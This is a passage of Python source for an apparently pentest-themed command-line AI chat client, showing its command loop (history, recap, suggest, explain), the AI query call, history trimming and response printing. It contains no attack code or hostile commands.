            _wm_say(f"Operator set to '{name}'.",col=C.GREEN,delay=SPEED_FAST); print(); continue

        elif cmd.startswith("mode "):
            mode=cmd.split("mode ",1)[1].strip().upper()
            _wm_say(f"Mode → [{mode}]",col=C.CYAN,delay=SPEED_FAST); print(); continue

        elif cmd=="history":
            if not full_log: _wm_say("No queries yet.",col=C.GRAY); print()
            else:
                print(c(C.CYAN,f"\n  [WM] Session ({len(full_log)} queries):\n"))
                for i,(q,_) in enumerate(full_log,1): print(f"  {c(C.GRAY,str(i).rjust(3)+'.')} {q}")
                print()
            continue

        elif cmd=="recap":
            if not full_log: _wm_say("Nothing to recap yet.",col=C.GRAY); print(); continue
            raw=f"Quick briefing recap of our session. Topics: {chr(10).join('- '+q for q,_ in full_log[-10:])}"

        elif cmd=="suggest":
            raw=(f"Based on our last topic '{full_log[-1][0]}', suggest the 3 best next steps."
                 if full_log else "I'm starting a pentest. Suggest an optimal workflow.")

        elif cmd.startswith("explain "):
            topic=raw.split("explain ",1)[1].strip()
            raw=f"Deep explanation of '{topic}': what it is, why it matters in pentesting, how it works technically, practical commands."

        # ── AI Query ──────────────────────────────────
        sp=Spinner(random.choice(THINK_LINES))
        sp.start()
        response,error=query_ai(raw,cfg,ai_history)
        sp.stop()

        if error:
            handle_error(error,cfg); continue

        ai_history.append({"role":"user","content":raw})
        ai_history.append({"role":"assistant","content":response})
        if len(ai_history)>30: ai_history=ai_history[-30:]
        session+=[("user",raw),("assistant",response)]
        full_log.append((raw,response))

        mm=re.search(r'\[MODE:\s*([A-Z]+)',response)
        if mm: mode=mm.group(1)

        w=twidth()
        print()
        print(c(C.GRAY,"  "+"━"*(w-4)))
        print(format_response(response))
        print(c(C.GRAY,"  "+"━"*(w-4)))
        # Occasional wisdom after response
        if random.random()<0.12:
            print()
            _wm_say(random.choice(HACKER_WISDOM),col=C.GRAY,delay=SPEED_FAST,tag="[WM]")
        print()

    save_readline()

if __name__=="__main__":
    main()
